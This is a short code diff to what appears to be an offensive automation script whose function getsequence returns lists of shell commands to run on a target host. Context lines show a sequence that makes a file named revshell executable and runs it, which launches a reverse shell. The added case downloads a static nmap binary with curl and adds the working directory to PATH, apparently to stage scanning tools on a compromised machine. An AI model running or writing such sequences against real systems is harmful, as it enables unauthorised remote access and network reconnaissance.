@@ -68,4 +68,8 @@ def getsequence(id=0, srv=""):
                 "chmod +x revshell",
                 "./revshell",
             ]
+        case 8 :
+            SEQUENCE = ["cd ~",
+              "curl -L https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap",
+              "PATH=$PATH:."]
     return SEQUENCE
